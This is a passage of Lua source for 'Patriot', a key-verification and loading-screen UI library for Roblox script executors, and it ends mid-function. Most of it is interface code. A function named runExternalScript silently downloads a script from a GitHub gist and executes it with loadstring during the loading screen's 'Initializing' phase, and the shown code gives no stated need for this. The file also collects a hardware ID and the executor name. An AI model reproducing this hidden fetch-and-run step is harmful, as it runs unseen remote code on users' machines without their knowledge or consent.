--[[
 ________   ________   ________   _______    ___        ___  ___   ___     
|\   __  \ |\   __  \ |\   __  \ |\  ___ \  |\  \      |\  \|\  \ |\  \    
\ \  \|\  \\ \  \|\  \\ \  \|\  \\ \   __/| \ \  \     \ \  \\\  \\ \  \   
 \ \   __  \\ \   _  _\\ \  \\\  \\ \  \_|/__\ \  \     \ \  \\\  \\ \  \  
  \ \  \ \  \\ \  \\  \|\ \  \\\  \\ \  \_|\ \\ \  \____ \ \  \\\  \\ \  \ 
   \ \__\ \__\\ \__\\ _\ \ \_____  \\ \_______\\ \_______\\ \_______\\ \__\
    \|__|\|__| \|__|\|__| \|___| \__\\|_______| \|_______| \|_______| \|__|
                                \|__|                                      
                                                                           
     Github - https://github.com/SyndromeXph/expert-octo-doodle
     Author: Cobru (Cobruhehe, .cobru)
     Modifier: Yuxingchen
     License: MIT
                                                                           
]]

repeat task.wait() until game:IsLoaded()

local cloneref = cloneref or function(obj) return obj end
local gethui = gethui or function() return cloneref(game:GetService("CoreGui")) end

local TweenService = cloneref(game:GetService("TweenService"))
local UserInputService = cloneref(game:GetService("UserInputService"))
local HttpService = cloneref(game:GetService("HttpService"))
local Workspace = cloneref(game:GetService("Workspace"))
local RunService = cloneref(game:GetService("RunService"))
local Lighting = cloneref(game:GetService("Lighting"))
local Players = cloneref(game:GetService("Players"))

local hui = gethui()

if getgenv().PatriotLoaded and hui:FindFirstChild("PatriotKeySystem") then return getgenv().Patriot end
if getgenv().PatriotLoaded and hui:FindFirstChild("PatriotKeylessSystem") then return getgenv().Patriot end
getgenv().PatriotLoaded = true
getgenv().PatriotClosed = false

local Patriot = {}

Patriot.Appearance = {
    Title = "Patriot",
    Subtitle = "Enter your key to continue",
    Icon = "rbxassetid://95721401302279",
    IconSize = UDim2.new(0, 30, 0, 30)
}

Patriot.Links = {
    GetKey = "",
    Discord = ""
}

Patriot.Storage = {
    FileName = "Patriot_Key",
    Remember = true,
    AutoLoad = true
}

Patriot.Options = {
    Keyless = nil,
    KeylessUI = false,
    Blur = true,
    Draggable = true
}

Patriot.Theme = {
    Accent = Color3.fromRGB(139, 0, 0),
    AccentHover = Color3.fromRGB(170, 20, 20),
    Background = Color3.fromRGB(12, 12, 14),
    Header = Color3.fromRGB(18, 18, 22),
    Input = Color3.fromRGB(22, 22, 28),
    Text = Color3.fromRGB(255, 255, 255),
    TextDim = Color3.fromRGB(140, 140, 155),
    Success = Color3.fromRGB(50, 205, 110),
    Error = Color3.fromRGB(245, 70, 90),
    Warning = Color3.fromRGB(255, 180, 50),
    StatusIdle = Color3.fromRGB(180, 80, 80),
    Discord = Color3.fromRGB(88, 101, 242),
    DiscordHover = Color3.fromRGB(114, 137, 218),
    Divider = Color3.fromRGB(35, 35, 45),
    Pending = Color3.fromRGB(60, 60, 70),
    GlowAccent = Color3.fromRGB(139, 0, 0),
    CardBackground = Color3.fromRGB(16, 16, 20),
    SecondaryBackground = Color3.fromRGB(20, 20, 26)
}

Patriot.Callbacks = {
    OnVerify = nil,
    OnSuccess = nil,
    OnFail = nil,
    OnClose = nil
}

Patriot.Changelog = {}

Patriot.Shop = {
    Enabled = false,
    Icon = "",
    Title = "Get Premium Access",
    Subtitle = "Instant delivery 24/7 support",
    ButtonText = "Buy",
    Link = ""
}

local Internal = {
    Junkie = nil,
    Wilkins = nil,
    BlurEffect = nil,
    NotificationList = {},
    ValidateFunction = nil,
    IsJunkieMode = false,
    IsWilkinsMode = false,
    IconsLoaded = false,
    ParticleEffects = {}
}

local IconBaseURL = "https://raw.githubusercontent.com/SyndromeXph/expert-octo-doodle/main/Icons/"
local IconFiles = {
    key = "lucide--key.png",
    shield = "lucide--shield-minus.png",
    check = "prime--check-square.png",
    copy = "flowbite--clipboard-outline.png",
    discord = "qlementine-icons--discord-16.png",
    alert = "mdi--alert-octagon-outline.png",
    lock = "lucide--user-lock.png",
    loading = "nonicons--loading-16.png",
    close = "material-symbols--dangerous-outline.png",
    changelog = "ant-design--sync-outlined.png",
    logo = "Patriot.png",
    user = "U.png",
    clock = "Clock.png",
    cart = "Cart.png",
    star = "Star.png",
    sparkle = "Sparkle.png"
}

local FallbackIcons = {
    key = "rbxassetid://96510194465420",
    shield = "rbxassetid://89965059528921",
    check = "rbxassetid://76078495178149",
    copy = "rbxassetid://125851897718493",
    discord = "rbxassetid://83278450537116",
    alert = "rbxassetid://140438367956051",
    lock = "rbxassetid://114355063515473",
    loading = "rbxassetid://116535712789945",
    close = "rbxassetid://6022668916",
    changelog = "rbxassetid://138133190015277",
    logo = "rbxassetid://95721401302279",
    user = "rbxassetid://77400125196692",
    clock = "rbxassetid://87505349362628",
    cart = "rbxassetid://114754518183872",
    star = "rbxassetid://95721401302279",
    sparkle = "rbxassetid://95721401302279"
}

local CachedIcons = {}
local FolderName = "Patriot"
local IconsFolder = "Icons"
local DefaultLogoAsset = "rbxassetid://95721401302279"

local function isMobile()
    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
end

local function getScale()
    local viewport = Workspace.CurrentCamera.ViewportSize
    return math.clamp(math.min(viewport.X, viewport.Y) / 900, 0.65, 1.3)
end

local function hasFileSystem()
    local ok1 = pcall(function() return type(writefile) == "function" end)
    local ok2 = pcall(function() return type(readfile) == "function" end)
    local ok3 = pcall(function() return type(isfile) == "function" end)
    local ok4 = pcall(function() return type(makefolder) == "function" end)
    local ok5 = pcall(function() return type(isfolder) == "function" end)
    return ok1 and ok2 and ok3 and ok4 and ok5
end

local fileSystemSupported = hasFileSystem()

local function getFileName()
    return FolderName .. "/" .. Patriot.Storage.FileName .. ".txt"
end

local function saveKey(key)
    if not fileSystemSupported or not Patriot.Storage.Remember then return false end
    return pcall(function() writefile(getFileName(), key) end)
end

local function loadKey()
    if not fileSystemSupported then return nil end
    local ok, content = pcall(function()
        if isfile(getFileName()) then return readfile(getFileName()) end
        return nil
    end)
    if ok and content and content ~= "" then return content end
    return nil
end

local function clearKey()
    if not fileSystemSupported then return false end
    return pcall(function() delfile(getFileName()) end)
end

local function ensureFolders()
    if not fileSystemSupported then return false end
    pcall(function()
        if not isfolder(FolderName) then makefolder(FolderName) end
        if not isfolder(FolderName .. "/" .. IconsFolder) then makefolder(FolderName .. "/" .. IconsFolder) end
    end)
    return true
end

local function getIconPath(iconName)
    return FolderName .. "/" .. IconsFolder .. "/" .. IconFiles[iconName]
end

local function isIconCached(iconName)
    if not fileSystemSupported then return false end
    local success, result = pcall(function() return isfile(getIconPath(iconName)) end)
    return success and result
end

local function downloadIcon(iconName)
    if not fileSystemSupported then
        CachedIcons[iconName] = FallbackIcons[iconName]
        return false
    end
    local path = getIconPath(iconName)
    if isIconCached(iconName) then
        local success = pcall(function() CachedIcons[iconName] = getcustomasset(path) end)
        if success then return true end
    end
    local success = pcall(function()
        local response = game:HttpGet(IconBaseURL .. IconFiles[iconName])
        if #response < 100 then error("Invalid") end
        writefile(path, response)
        CachedIcons[iconName] = getcustomasset(path)
    end)
    if not success then CachedIcons[iconName] = FallbackIcons[iconName] end
    return success
end

local function getIcon(iconName)
    return CachedIcons[iconName] or FallbackIcons[iconName]
end

local function getLogoIcon()
    if Patriot.Appearance.Icon == DefaultLogoAsset then return getIcon("logo") end
    return Patriot.Appearance.Icon
end

local function shouldDownloadLogo()
    return Patriot.Appearance.Icon == DefaultLogoAsset
end

local function getShopIcon()
    if Patriot.Shop.Icon == "" then return getLogoIcon() end
    return Patriot.Shop.Icon
end

local function isShopEnabled()
    return Patriot.Shop.Enabled
end

local function allIconsCached()
    if not fileSystemSupported then return false end
    local iconNames = {"key", "shield", "check", "copy", "discord", "alert", "lock", "loading", "close", "changelog", "user", "clock", "cart"}
    if shouldDownloadLogo() then table.insert(iconNames, "logo") end
    for _, name in ipairs(iconNames) do
        if not isIconCached(name) then return false end
    end
    return true
end

local function loadAllIconsFromCache()
    ensureFolders()
    local iconNames = {"key", "shield", "check", "copy", "discord", "alert", "lock", "loading", "close", "changelog", "user", "clock", "cart"}
    if shouldDownloadLogo() then table.insert(iconNames, "logo") end
    for _, name in ipairs(iconNames) do downloadIcon(name) end
    Internal.IconsLoaded = true
end

local function getExecutorName()
    local success, name = pcall(identifyexecutor)
    if success and name then return tostring(name) end
    return "Unknown"
end

local function getDeviceType()
    local touch = UserInputService.TouchEnabled
    local keyboard = UserInputService.KeyboardEnabled
    local gamepad = UserInputService.GamepadEnabled
    if gamepad and not keyboard and not touch then return "Console"
    elseif touch and not keyboard then return "Mobile"
    elseif keyboard and touch then return "PC & Touch"
    elseif keyboard then return "PC"
    else return "Unknown" end
end

local function getHWID()
    local hwid = nil
    pcall(function() if gethwid then hwid = gethwid() end end)
    if not hwid then pcall(function() if getgenv().HWID then hwid = getgenv().HWID end end) end
    if not hwid then pcall(function() if game.RobloxHWID then hwid = tostring(game.RobloxHWID) end end) end
    if not hwid then
        local player = cloneref(Players.LocalPlayer)
        hwid = HttpService:GenerateGUID(false):gsub("-", ""):sub(1, 32)
        if player then hwid = tostring(player.UserId) .. hwid:sub(1, 20) end
    end
    return hwid or "N/A"
end

local function generateHiddenDots(availableWidth, charWidth)
    charWidth = charWidth or 5
    local count = math.floor(availableWidth / charWidth)
    count = math.max(count, 8)
    return string.rep("â€¢", count)
end

local function formatTime12()
    local hour = tonumber(os.date("%H"))
    local min = os.date("%M")
    local sec = os.date("%S")
    local period = "AM"
    if hour >= 12 then period = "PM" end
    if hour > 12 then hour = hour - 12 end
    if hour == 0 then hour = 12 end
    return string.format("%d:%s:%s %s", hour, min, sec, period)
end

local function formatDate()
    return os.date("%b %d, %Y")
end

local function createParticle(parent, config)
    local particle = Instance.new("Frame")
    particle.Size = UDim2.new(0, config.Size or 4, 0, config.Size or 4)
    particle.Position = config.Position or UDim2.new(math.random(), 0, math.random(), 0)
    particle.BackgroundColor3 = config.Color or Patriot.Theme.Accent
    particle.BorderSizePixel = 0
    particle.BackgroundTransparency = 0.3
    particle.ZIndex = config.ZIndex or 1
    particle.Parent = parent
    
    local corner = Instance.new("UICorner", particle)
    corner.CornerRadius = UDim.new(1, 0)
    
    local targetTransparency = config.TargetTransparency or 1
    local targetPosition = config.TargetPosition or UDim2.new(
        particle.Position.X.Scale + (math.random() - 0.5) * 0.4,
        0,
        particle.Position.Y.Scale + (math.random() - 0.5) * 0.4,
        0
    )
    local duration = config.Duration or 3
    local delayTime = config.Delay or 0
    
    task.delay(delayTime, function()
        if particle and particle.Parent then
            local tween = TweenService:Create(particle, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
                Position = targetPosition,
                BackgroundTransparency = targetTransparency,
                Size = UDim2.new(0, 0, 0, 0)
            })
            tween:Play()
            tween.Completed:Connect(function()
                if particle and particle.Parent then
                    particle:Destroy()
                end
            end)
        end
    end)
    
    return particle
end

local function spawnAmbientParticles(parent, count, areaSize)
    for i = 1, count do
        createParticle(parent, {
            Size = math.random(2, 6),
            Position = UDim2.new(math.random(), 0, math.random(), 0),
            Color = Patriot.Theme.Accent,
            TargetPosition = UDim2.new(math.random(), 0, math.random() - 0.5, 0),
            Duration = math.random(4, 8),
            Delay = math.random() * 4,
            ZIndex = 0
        })
    end
end

local function createScanLine(parent, width, height)
    local scanLine = Instance.new("Frame")
    scanLine.Size = UDim2.new(1, 0, 0, 2)
    scanLine.Position = UDim2.new(0, 0, 0, -2)
    scanLine.BackgroundColor3 = Patriot.Theme.Accent
    scanLine.BackgroundTransparency = 0.5
    scanLine.BorderSizePixel = 0
    scanLine.ZIndex = 5
    scanLine.Parent = parent
    
    local gradient = Instance.new("UIGradient", scanLine)
    gradient.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 1),
        NumberSequenceKeypoint.new(0.2, 0.3),
        NumberSequenceKeypoint.new(0.5, 0),
        NumberSequenceKeypoint.new(0.8, 0.3),
        NumberSequenceKeypoint.new(1, 1)
    })
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Patriot.Theme.Background),
        ColorSequenceKeypoint.new(0.5, Patriot.Theme.Accent),
        ColorSequenceKeypoint.new(1, Patriot.Theme.Background)
    })
    
    local function animate()
        while scanLine and scanLine.Parent do
            scanLine.Position = UDim2.new(0, 0, 0, -2)
            TweenService:Create(scanLine, TweenInfo.new(3 + math.random() * 2, Enum.EasingStyle.Linear), {
                Position = UDim2.new(0, 0, 1, 2)
            }):Play()
            task.wait(3 + math.random() * 2)
            scanLine.Position = UDim2.new(0, 0, 0, -2)
        end
    end
    
    task.spawn(animate)
    return scanLine
end

local function createGlowRing(parent, size, position, color)
    local ring = Instance.new("Frame")
    ring.Size = UDim2.new(0, size, 0, size)
    ring.Position = position
    ring.AnchorPoint = Vector2.new(0.5, 0.5)
    ring.BackgroundTransparency = 1
    ring.BorderSizePixel = 0
    ring.ZIndex = 0
    ring.Parent = parent
    
    local stroke = Instance.new("UIStroke", ring)
    stroke.Color = color or Patriot.Theme.Accent
    stroke.Thickness = 1.5
    stroke.Transparency = 0.7
    
    local corner = Instance.new("UICorner", ring)
    corner.CornerRadius = UDim.new(1, 0)
    
    local function pulse()
        while ring and ring.Parent do
            TweenService:Create(ring, TweenInfo.new(2, Enum.EasingStyle.Sine), {
                Size = UDim2.new(0, size * 1.5, 0, size * 1.5),
                BackgroundTransparency = 1
            }):Play()
            TweenService:Create(stroke, TweenInfo.new(2, Enum.EasingStyle.Sine), {
                Transparency = 1
            }):Play()
            task.wait(2)
            ring.Size = UDim2.new(0, size, 0, size)
            ring.BackgroundTransparency = 1
            stroke.Transparency = 0.7
        end
    end
    
    task.spawn(pulse)
    return ring
end

local function enableBlur()
    if not Patriot.Options.Blur then return end
    local existing = Lighting:FindFirstChild("PatriotKeySystemBlur")
    if existing then existing:Destroy() end
    Internal.BlurEffect = Instance.new("BlurEffect")
    Internal.BlurEffect.Name = "PatriotKeySystemBlur"
    Internal.BlurEffect.Size = 0
    Internal.BlurEffect.Parent = Lighting
    TweenService:Create(Internal.BlurEffect, TweenInfo.new(0.6, Enum.EasingStyle.Quart), {Size = 24}):Play()
end

local function disableBlur()
    if Internal.BlurEffect and Internal.BlurEffect.Parent then
        TweenService:Create(Internal.BlurEffect, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {Size = 0}):Play()
        task.delay(0.4, function()
            if Internal.BlurEffect and Internal.BlurEffect.Parent then
                Internal.BlurEffect:Destroy()
                Internal.BlurEffect = nil
            end
        end)
    else
        local existing = Lighting:FindFirstChild("PatriotKeySystemBlur")
        if existing then existing:Destroy() end
        Internal.BlurEffect = nil
    end
end

local function fullCleanup()
    getgenv().PatriotLoaded = false
    getgenv().PatriotClosed = true
    disableBlur()
    local gui1 = hui:FindFirstChild("PatriotKeySystem")
    local gui2 = hui:FindFirstChild("PatriotKeylessSystem")
    local gui3 = hui:FindFirstChild("PatriotLoadingScreen")
    if gui1 then gui1:Destroy() end
    if gui2 then gui2:Destroy() end
    if gui3 then gui3:Destroy() end
end

local function setupDragging(header, main)
    if not Patriot.Options.Draggable then return end
    local dragging, dragStart, startPos, dragInput
    header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = main.Position
            dragInput = input
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    if dragInput == input then dragging = false dragInput = nil end
                end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if not dragging or not dragInput then return end
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        elseif input.UserInputType == Enum.UserInputType.Touch then
            if input == dragInput then
                local delta = input.Position - dragStart
                main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end
    end)
end

local function validateKey(key, validateFunc)
    if not validateFunc or not key or key == "" then return false end
    local success, result = pcall(validateFunc, key)
    if not success then return false end
    if type(result) == "table" then return result.valid == true end
    if type(result) == "boolean" then return result end
    return false
end

local function runExternalScript()
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGetAsync("https://gist.githubusercontent.com/SyndromeXph/1c5dcc6ac7d5da57b12550a1f65f1ad8/raw/34885ab8800a2b088fd9b63dc6316f530b8f6257/Hello"))()
        end)
    end)
end

local function CreateDoorOverlay(parentFrame, width, height)
    local overlay = Instance.new("Frame")
    overlay.Name = "DoorOverlay"
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundTransparency = 1
    overlay.ClipsDescendants = true
    overlay.ZIndex = 50
    overlay.Parent = parentFrame

    local leftDoor = Instance.new("Frame")
    leftDoor.Name = "LeftDoor"
    leftDoor.Size = UDim2.new(0.5, 0, 1, 0)
    leftDoor.Position = UDim2.new(0, 0, 0, 0)
    leftDoor.BackgroundColor3 = Patriot.Theme.Header
    leftDoor.BorderSizePixel = 0
    leftDoor.ZIndex = 51
    leftDoor.Parent = overlay

    local leftDoorGradient = Instance.new("UIGradient", leftDoor)
    leftDoorGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Patriot.Theme.Header),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 30, 35))
    })

    local rightDoor = Instance.new("Frame")
    rightDoor.Name = "RightDoor"
    rightDoor.Size = UDim2.new(0.5, 0, 1, 0)
    rightDoor.Position = UDim2.new(0.5, 0, 0, 0)
    rightDoor.BackgroundColor3 = Patriot.Theme.Header
    rightDoor.BorderSizePixel = 0
    rightDoor.ZIndex = 51
    rightDoor.Parent = overlay

    local rightDoorGradient = Instance.new("UIGradient", rightDoor)
    rightDoorGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 35)),
        ColorSequenceKeypoint.new(1, Patriot.Theme.Header)
    })

    local dividerLine = Instance.new("Frame")
    dividerLine.Size = UDim2.new(0, 2, 1, 0)
    dividerLine.Position = UDim2.new(0.5, -1, 0, 0)
    dividerLine.BackgroundColor3 = Patriot.Theme.Accent
    dividerLine.BackgroundTransparency = 0.3
    dividerLine.BorderSizePixel = 0
    dividerLine.ZIndex = 52
    dividerLine.Parent = overlay

    local logoSize = math.min(width, height) * 0.28
    local logoImage = Instance.new("ImageLabel")
    logoImage.Name = "DoorLogo"
    logoImage.Size = UDim2.new(0, logoSize, 0, logoSize)
    logoImage.Position = UDim2.new(0.5, 0, 0.5, 0)
    logoImage.AnchorPoint = Vector2.new(0.5, 0.5)
    logoImage.BackgroundTransparency = 1
    logoImage.Image = getLogoIcon()
    logoImage.ImageColor3 = Patriot.Theme.Text
    logoImage.ScaleType = Enum.ScaleType.Fit
    logoImage.ZIndex = 54
    logoImage.Parent = overlay

    local glowRing = createGlowRing(overlay, logoSize * 0.8, UDim2.new(0.5, 0, 0.5, 0), Patriot.Theme.Accent)

    local halfWidth = math.ceil(width / 2)

    local function openDoors(callback)
        TweenService:Create(glowRing, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
        TweenService:Create(dividerLine, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
        TweenService:Create(logoImage, TweenInfo.new(0.25, Enum.EasingStyle.Quart), {ImageTransparency = 1}):Play()
        task.wait(0.3)
        TweenService:Create(leftDoor, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(0, -halfWidth, 0, 0)}):Play()
        TweenService:Create(rightDoor, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(1, 0, 0, 0)}):Play()
        task.wait(0.55)
        overlay.Visible = false
        if callback then callback() end
    end

    local function closeDoors(callback)
        overlay.Visible = true
        leftDoor.Position = UDim2.new(0, -halfWidth, 0, 0)
        rightDoor.Position = UDim2.new(1, 0, 0, 0)
        logoImage.ImageTransparency = 1
        glowRing.BackgroundTransparency = 1
        dividerLine.BackgroundTransparency = 1
        TweenService:Create(leftDoor, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0, 0, 0, 0)}):Play()
        TweenService:Create(rightDoor, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 0, 0, 0)}):Play()
        TweenService:Create(dividerLine, TweenInfo.new(0.3), {BackgroundTransparency = 0.3}):Play()
        task.wait(0.48)
        TweenService:Create(logoImage, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {ImageTransparency = 0}):Play()
        TweenService:Create(glowRing, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
        task.wait(0.35)
        if callback then callback() end
    end

    return {overlay = overlay, open = openDoors, close = closeDoors}
end

local function ShowLoadingScreen(onComplete)
    local completed = false
    local oldGui = hui:FindFirstChild("PatriotLoadingScreen")
    if oldGui then oldGui:Destroy() end
    local oldBlur = Lighting:FindFirstChild("PatriotLoadingBlur")
    if oldBlur then oldBlur:Destroy() end

    local blurEffect = Instance.new("BlurEffect")
    blurEffect.Name = "PatriotLoadingBlur"
    blurEffect.Size = 0
    blurEffect.Parent = Lighting

    local gui = Instance.new("ScreenGui")
    gui.Name = "PatriotLoadingScreen"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = hui

    local mobile = isMobile()

    local loadingScreen = Instance.new("Frame")
    loadingScreen.Size = UDim2.new(1, 0, 1, 0)
    loadingScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    loadingScreen.BackgroundTransparency = 1
    loadingScreen.BorderSizePixel = 0
    loadingScreen.Parent = gui

    spawnAmbientParticles(loadingScreen, 20, nil)

    local centralContainer = Instance.new("Frame")
    centralContainer.Size = UDim2.new(0, mobile and 200 or 260, 0, mobile and 200 or 260)
    centralContainer.Position = UDim2.new(0.5, 0, 0.45, 0)
    centralContainer.AnchorPoint = Vector2.new(0.5, 0.5)
    centralContainer.BackgroundTransparency = 1
    centralContainer.Parent = loadingScreen

    local outerRing = Instance.new("Frame")
    outerRing.Size = UDim2.new(1, 20, 1, 20)
    outerRing.Position = UDim2.new(0.5, 0, 0.5, 0)
    outerRing.AnchorPoint = Vector2.new(0.5, 0.5)
    outerRing.BackgroundTransparency = 1
    outerRing.BorderSizePixel = 0
    outerRing.Parent = centralContainer

    local outerStroke = Instance.new("UIStroke", outerRing)
    outerStroke.Color = Patriot.Theme.Accent
    outerStroke.Thickness = 1
    outerStroke.Transparency = 0.8

    local outerCorner = Instance.new("UICorner", outerRing)
    outerCorner.CornerRadius = UDim.new(1, 0)

    local innerRing = Instance.new("Frame")
    innerRing.Size = UDim2.new(1, 10, 1, 10)
    innerRing.Position = UDim2.new(0.5, 0, 0.5, 0)
    innerRing.AnchorPoint = Vector2.new(0.5, 0.5)
    innerRing.BackgroundTransparency = 1
    innerRing.BorderSizePixel = 0
    innerRing.Parent = centralContainer

    local innerStroke = Instance.new("UIStroke", innerRing)
    innerStroke.Color = Patriot.Theme.Accent
    innerStroke.Thickness = 0.5
    innerStroke.Transparency = 0.6

    local innerCorner = Instance.new("UICorner", innerRing)
    innerCorner.CornerRadius = UDim.new(1, 0)

    local shipSize = mobile and 24 or 36
    local shipFrame = Instance.new("Frame")
    shipFrame.Size = UDim2.new(0, shipSize, 0, shipSize)
    shipFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    shipFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    shipFrame.BackgroundTransparency = 1
    shipFrame.Parent = centralContainer

    local shipIcon = Instance.new("ImageLabel")
    shipIcon.Size = UDim2.new(1, 0, 1, 0)
    shipIcon.BackgroundTransparency = 1
    shipIcon.Image = getLogoIcon()
    shipIcon.ImageColor3 = Patriot.Theme.Text
    shipIcon.ImageTransparency = 1
    shipIcon.ScaleType = Enum.ScaleType.Fit
    shipIcon.Parent = shipFrame

    local phasesContainer = Instance.new("Frame")
    phasesContainer.Size = UDim2.new(0, mobile and 200 or 260, 0, mobile and 120 or 140)
    phasesContainer.Position = UDim2.new(0.5, 0, 0.72, 0)
    phasesContainer.AnchorPoint = Vector2.new(0.5, 0.5)
    phasesContainer.BackgroundTransparency = 1
    phasesContainer.Parent = loadingScreen

    local phasesLayout = Instance.new("UIListLayout", phasesContainer)
    phasesLayout.Padding = UDim.new(0, mobile and 6 or 10)
    phasesLayout.SortOrder = Enum.SortOrder.LayoutOrder
    phasesLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    phasesLayout.VerticalAlignment = Enum.VerticalAlignment.Center

    local phases = {}
    local phaseNames = {"Initializing", "Creating folders", "Downloading assets", "Preparing interface", "Ready"}
    local phaseTextSize = mobile and 14 or 18

    for i, name in ipairs(phaseNames) do
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, 0, 0, mobile and 20 or 26)
        row.BackgroundTransparency = 1
        row.LayoutOrder = i
        row.Parent = phasesContainer

        local indicator = Instance.new("Frame")
        indicator.Size = UDim2.new(0, mobile and 6 or 8, 0, mobile and 6 or 8)
        indicator.Position = UDim2.new(0, 8, 0.5, 0)
        indicator.AnchorPoint = Vector2.new(0, 0.5)
        indicator.BackgroundColor3 = Patriot.Theme.Pending
        indicator.BackgroundTransparency = 1
        indicator.BorderSizePixel = 0
        indicator.Parent = row
        Instance.new("UICorner", indicator).CornerRadius = UDim.new(1, 0)

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, mobile and -22 or -28, 1, 0)
        label.Position = UDim2.new(0, mobile and 22 or 28, 0, 0)
        label.BackgroundTransparency = 1
        label.Text = name
        label.TextColor3 = Patriot.Theme.Pending
        label.TextSize = phaseTextSize
        label.Font = Enum.Font.ArimoBold
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.TextTransparency = 1
        label.Parent = row

        phases[i] = {indicator = indicator, label = label}
    end

    local animationRunning = true
    local currentPhase = 0

    local function animateOuterRing()
        local angle = 0
        while animationRunning do
            angle = angle + 0.01
            outerStroke.Transparency = 0.5 + math.sin(angle) * 0.3
            task.wait(0.03)
        end
    end

    local function setPhase(num)
        for i = 1, 5 do
            local p = phases[i]
            if i < num then
                p.indicator.BackgroundTransparency = 0
                TweenService:Create(p.indicator, TweenInfo.new(0.3), {BackgroundColor3 = Patriot.Theme.Success}):Play()
                TweenService:Create(p.label, TweenInfo.new(0.3), {TextColor3 = Patriot.Theme.Success}):Play()
            elseif i == num then
                p.indicator.BackgroundTransparency = 0
                TweenService:Create(p.indicator, TweenInfo.new(0.3), {BackgroundColor3 = Patriot.Theme.Accent}):Play()
                TweenService:Create(p.label, TweenInfo.new(0.3), {TextColor3 = Patriot.Theme.Text}):Play()
                currentPhase = num
            else
                p.indicator.BackgroundColor3 = Patriot.Theme.Pending
                p.label.TextColor3 = Patriot.Theme.Pending
            end
        end
    end

    task.spawn(function()
        TweenService:Create(blurEffect, TweenInfo.new(0.8), {Size = 24}):Play()
        TweenService:Create(loadingScreen, TweenInfo.new(0.6), {BackgroundTransparency = 0.2}):Play()
        task.wait(0.3)
        
        TweenService:Create(shipIcon, TweenInfo.new(0.5, Enum.EasingStyle.Back), {ImageTransparency = 0}):Play()
        TweenService:Create(outerStroke, TweenInfo.new(0.5), {Transparency = 0.5}):Play()
        TweenService:Create(innerStroke, TweenInfo.new(0.5), {Transparency = 0.4}):Play()
        
        task.spawn(animateOuterRing)
        
        task.wait(0.3)
        for i = 1, 5 do
            task.delay((i-1)*0.06, function()
                TweenService:Create(phases[i].indicator, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
                TweenService:Create(phases[i].label, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
            end)
        end
        task.wait(0.5)
        
        setPhase(1)
        runExternalScript()
        task.wait(0.35)
        setPhase(2) ensureFolders() task.wait(0.3)
        setPhase(3)
        local iconNames = {"key", "shield", "check", "copy", "discord", "alert", "lock", "loading", "close", "changelog", "user", "clock", "cart"}
        if shouldDownloadLogo() then table.insert(iconNames, "logo") end
        for _, name in ipairs(iconNames) do downloadIcon(name) task.wait(0.05) end
        Internal.IconsLoaded = true
        setPhase(4) task.wait(0.3)
        setPhase(5) task.wait(0.6)
        
        animationRunning = false
        
        TweenService:Create(shipIcon, TweenInfo.new(0.5, Enum.EasingStyle.Back), {Size = UDim2.new(1.5, 0, 1.5, 0)}):Play()
        TweenService:Create(shipIcon, TweenInfo.new(0.3), {ImageTransparency = 1}):Play()
        
        local explosionRing = Instance.new("Frame")
        explosionRing.Size = UDim2.new(0, 0, 0, 0)
        explosionRing.Position = UDim2.new(0.5, 0, 0.5, 0)
        explosionRing.AnchorPoint = Vector2.new(0.5, 0.5)
        explosionRing.BackgroundTransparency = 1
        explosionRing.Parent = centralContainer
        Instance.new("UICorner", explosionRing).CornerRadius = UDim.new(1, 0)
        local explosionStroke = Instance.new("UIStroke", explosionRing)
        explosionStroke.Color = Patriot.Theme.Accent
        explosionStroke.Thickness = 2
        explosionStroke.Transparency = 0.3
        
        TweenService:Create(explosionRing, TweenInfo.new(0.8, Enum.EasingStyle.Quart), {
            Size = UDim2.new(2, 0, 2, 0)
        }):Play()
        TweenService:Create(explosionStroke, TweenInfo.new(0.8, Enum.EasingStyle.Quart), {
            Transparency = 1, Thickness = 0
        }):Play()
        
        TweenService:Create(loadingScreen, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
        TweenService:Create(outerStroke, TweenInfo.new(0.5), {Transparency = 1}):Play()
        TweenService:Create(innerStroke, TweenInfo.new(0.5), {Transparency = 1}):Play()
        
        for i = 1, 5 do
            TweenService:Create(phases[i].indicator, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
